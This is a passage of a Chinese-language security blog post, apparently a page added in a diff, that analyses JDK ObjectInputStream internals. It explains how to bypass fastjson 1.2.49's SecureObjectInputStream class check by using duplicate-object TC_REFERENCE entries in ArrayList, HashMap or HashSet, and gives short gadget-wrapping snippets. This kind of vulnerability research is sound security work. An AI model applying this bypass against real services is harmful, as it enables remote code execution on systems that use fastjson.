+<p>会将这个反序列化过程委托给SecureObjectInputStream进行处理<br>这个SecureObjectInputStream类继承于ObjectInputStream，而ObjectInputStream的readObject方法会调用resolveClass方法，而在SecureObjectInputStream类当中，resolveClass方法会调用checkAutoType方法做类的检查，因此我们需要找到一个办法，绕过checkAutoType方法的检测<br>就要看看，ObjectInputStream是如何重建对象的，它会把哪些类型丢进resolveClass呢？<br>再次之前，请先了解一下resolveClass的防御模式<br> ObjectInputStream#readObject-&gt;readObject0</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object <span class="title function_">readObject0</span><span class="params">(<span class="type">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">oldMode</span> <span class="operator">=</span> bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">remain</span> <span class="operator">=</span> bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Fix for 4360508: stream is currently at the end of a field</span></span><br><span class="line"><span class="comment">             * value block written via default serialization; since there</span></span><br><span class="line"><span class="comment">             * is no terminating TC_ENDBLOCKDATA tag, simulate</span></span><br><span class="line"><span class="comment">             * end-of-custom-data behavior explicitly.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span> tc;</span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                        bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                    String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span> tc;</span><br><span class="line"><span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">    bin.readByte();</span><br><span class="line">    handleReset();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>这个字节是aced（序列化Stream标识）0005（版本号）之后的第一个字节，这里为0x73，即十进制的115，之后便会根据这个值进入对应的分支：TC_OBJECT，且在这个分支之中会进入readOrdinaryObject之中<br>readOrdinaryObject</p>
+<p><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181100869.png"></p>
+<p>obj的实例化来自于desc，而desc来自readClassDesc<br>readClassDesc</p>
+<p><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181116675.png"></p>
+<p>会再次更加类型进入到各分支中。我们这里是一个类，所以会进入TC_CLASSDESC，使用readNonProxyDesc获得类的描述信息（字段值之类的）<br>readNonProxyDesc</p>
+<p><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181126722.png"></p>
+<p>在这个方法里面，先利用readClassDescriptor获取字段信息，然后使用resolveClass去解析。最后使用initNonProxy把刚刚的字段信息，装载成类描述符，然后返回</p>
+<p>正常来讲，resolveClass会通过反射加载类  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="literal">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>而SecureObjectInputStream类里的resolveClass在反射调用之前先进行一层WAF  </p>
+<p>再回到readOrdinaryObject方法，获得类描述符之后，会检查是否可以反序列化checkDeserialize，然后再readSerialData  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span> || handles.lookupException(passHandle) != <span class="literal">null</span>) &#123;</span><br><span class="line">                defaultReadFields(<span class="literal">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;<span class="comment">//判断是否有重写的readobject</span></span><br><span class="line">                <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="literal">null</span>)</span><br><span class="line">                    oldContext.check();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="built_in">this</span>);<span class="comment">//调用重写的readObject</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * In most cases, the handle table has already</span></span><br><span class="line"><span class="comment">                     * propagated a CNFException to passHandle at this</span></span><br><span class="line"><span class="comment">                     * point; this mark call is included to address cases</span></span><br><span class="line"><span class="comment">                     * where the custom readObject method has cons&#x27;ed and</span></span><br><span class="line"><span class="comment">                     * thrown a new CNFException of its own.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    handles.markException(passHandle, ex);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    curContext.setUsed();</span><br><span class="line">                    <span class="keyword">if</span> (oldContext!= <span class="literal">null</span>)</span><br><span class="line">                        oldContext.check();</span><br><span class="line">                    curContext = oldContext;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * defaultDataEnd may have been set indirectly by custom</span></span><br><span class="line"><span class="comment">                 * readObject() method when calling defaultReadObject() or</span></span><br><span class="line"><span class="comment">                 * readFields(); clear it to restore normal read behavior.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                defaultDataEnd = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                defaultReadFields(obj, slotDesc);<span class="comment">//进行数据填充</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                skipCustomData();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>经过这个函数反序列化基本结束，之后readOrdinaryObject返回Obj，readObject中再调用 vlist.doCallbacks()处理回调，结束反序列化流程，返回反序列化成功的Object。<br>图如下  </p>
+<p>那么我们将如何进行绕过呢？<br>在Switch-Case语句中，大部分方法最终都会调用readClassDesc去获取类的描述符，而不会调用readClassDesc方法的分支有TC_NULL、TC_REFERENCE、TC_STRING、TC_LONGSTRING、TC_EXCEPTION，其中NULL、STRING与LONGSTRING类型没有什么用处，EXCEPTION类型则是解决序列化终止相关，因此只剩下REFERENCE类型。<br>即，认为，不进入readClassDesc，即可以不用被WAF  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在java.io.ObjectOutputStream#writeObject0方法中存在一个判断，当再次写入同一对象时，如果在handles这个哈希表中查到了映射，就会通过writeHandle方法将重复对象以REFERENCE类型写入，因此向List、Set及Map类型中添加同样对象时即可成功利用  </span><br></pre></td></tr></table></figure></div>
+<p>那么只需我们加上一个就行了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(exception);</span><br></pre></td></tr></table></figure></div>
+<p>实验，成功</p>
+<p>当然不止用arrayList进行绕过，还有</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//map</span></span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(templates, exception);</span><br><span class="line"><span class="comment">//set</span></span><br><span class="line">HashSet&lt;Object&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">hashSet.add(templates);</span><br><span class="line">hashSet.add(exception);</span><br></pre></td></tr></table></figure></div>
+
+<p>附一张图<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250916181023079.png"></p>
+<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/">https://chenlvtang.top/2022/09/18/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E5%8F%8AresolveClass/</a><br><a target="_blank" rel="noopener" href="https://h3rmesk1t.github.io/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://h3rmesk1t.github.io/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br><a target="_blank" rel="noopener" href="https://infernity.top/2025/02/16/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%BA%E4%BB%80%E4%B9%88fastjson1%E7%9A%841-2-49%E4%BB%A5%E5%90%8E%E4%B8%8D%E5%86%8D%E8%83%BD%E5%88%A9%E7%94%A8">https://infernity.top/2025/02/16/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%BA%E4%BB%80%E4%B9%88fastjson1%E7%9A%841-2-49%E4%BB%A5%E5%90%8E%E4%B8%8D%E5%86%8D%E8%83%BD%E5%88%A9%E7%94%A8</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-48"><span class="toc-number">2.</span> <span class="toc-text">fastjson-1.2.48</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8D%8A%E6%AE%B5%E9%93%BE%E5%AD%90"><span class="toc-number">2.1.</span> <span class="toc-text">后半段链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%8D%8A%E6%AE%B5%E9%93%BE%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">前半段链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc1"><span class="toc-number">2.3.</span> <span class="toc-text">poc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc2"><span class="toc-number">2.4.</span> <span class="toc-text">poc2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson-1-2-49"><span class="toc-number">3.</span> <span class="toc-text">fastjson-1.2.49</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.0.1.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=fastjson原生反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=fastjson原生反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson原生反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson原生反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=fastjson原生反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=fastjson原生反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
